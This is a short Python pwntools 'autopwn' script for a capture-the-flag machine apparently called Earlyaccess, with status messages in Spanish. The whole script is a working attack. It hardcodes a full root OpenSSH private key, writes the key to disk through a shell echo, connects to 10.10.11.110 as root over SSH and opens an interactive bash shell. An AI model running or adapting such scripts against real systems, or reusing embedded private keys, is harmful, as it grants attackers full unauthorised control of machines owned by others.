try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Earlyaccess ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)


rsa = ("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEArIOXIvZx/5LspJVtY/Y5eT3B0g+hf1t4NEwLljBNrVzW3Y1JFDTL\nbsqeX+jY1B0lLH361DrhTMra1KSHtTtk+Y6FLqUaYOnlxPlEnaldg/F9c+ch6bzgvEoYai\nZ/GLfnkdrY9mmU3wrCi4c7OIe1YOwPPtNLYJb76qg7dVrj9beJjT+ZRG7JflgS/aQtFUVe\n9NkES/xNk80E4q1Ypbodj8pJcyWek9LXC5/+sdhV4KnUHZjoNZ+BlcpKsYvC0K1we02oC7\n3p05jrBZXYwCgzPTy/8DZ9FZr6oSBleQR8lPl6xPo6D32gcHRvVJCSakvVcjJWH2L227+3\n6g4RguqXGwAAA8ihamwioWpsIgAAAAdzc2gtcnNhAAABAQCsg5ci9nH/kuyklW1j9jl5Pc\nHSD6F/W3g0TAuWME2tXNbdjUkUNMtuyp5f6NjUHSUsffrUOuFMytrUpIe1O2T5joUupRpg\n6eXE+USdqV2D8X1z5yHpvOC8ShhqJn8Yt+eR2tj2aZTfCsKLhzs4h7Vg7A8+00tglvvqqD\nt1WuP1t4mNP5lEbsl+WBL9pC0VRV702QRL/E2TzQTirViluh2PyklzJZ6T0tcLn/6x2FXg\nqdQdmOg1n4GVykqxi8LQrXB7TagLvenTmOsFldjAKDM9PL/wNn0VmvqhIGV5BHyU+XrE+j\noPfaBwdG9UkJJqS9VyMlYfYvbbv7fqDhGC6pcbAAAAAwEAAQAAAQACv4Xk1LA0Ng73ADph\n4UZBHC6+PemAseBUVPHKTrKuFFCH7vw/CihDd47WUEtD9cLl1ovsXZPBOWoLASP4Sx3sq8\nyLVa355T/3x1DEgjIvK+WntwLfSlb6KOQCrOJRbnyN4kKaikwI0Y8P0fOrjt3g0WHcyljl\nDQKuVke8Mtp2y5L+qKOyh48O+nHvc9prBnyqq0wlgnNr/Fm/S4go2O8M2CWp9AeK7YdtlO\nY7Ertr9iCY3O+3U9W/4LLxu9JVacdhqGqnig6FMQfY9TmnRLdiDvYbzESPwNRtGtTDJoFf\nTgUJqvD+21ZT/k5gr2L4r8D/aB4z/ZES4x8F7IjG6+3hAAAAgBzC+fdpajuVkO3jTsleKx\nnpsnDqSPHlufw/U9nQutXTzv9CQClkOcCcJSONo3epcktDbx5LrUxtH72OmuZoLJCHPxtQ\n+nKJdRSuTfF9vMmMMr44ovq9chO6BfSHnlS6OAoMQZENxClUWjr95AOd7iZJ20MxdNyiZZ\n/ITMd6O6C/AAAAgQDYH/3pNv83rrECgtMai6pp2yS1bhLReI8SmnpJRSapk4+Ueh4Ww89N\nI3RMM6hSAKkB0/X99LZNUvnkkvUE9cZK15sA0RTUSm/hzfKx9TthtZMx4fIksnDlvk9Fix\nwo+Fdbj05u4++fWlQufx9lhfGdKLkSzvo4ycAp+0/aaOm6rwAAAIEAzFfEivv2iVee/lv4\n1AnfsSOFhJ2FNd58S6ApYqfoz7+dKDJ74k5HnrkCjD8tcRGld1Ebaq3lBEUn+5eI/km16P\nceeCjUt48nzOX23RvBAt9dAhl0UYQr/9Bc7Wuijv/Y9xJdp2s6V5CTaUuxA6283zxy+6+b\nfD4WoE/0eunE1VUAAAAQcm9vdEBlYXJseWFjY2VzcwECAw==\n-----END OPENSSH PRIVATE KEY-----")

os.system('echo "%s" > key' % (rsa))

request = ssh(host='10.10.11.110', user='root', keyfile='key')
shell = request.process("/bin/bash")
shell.interactive()
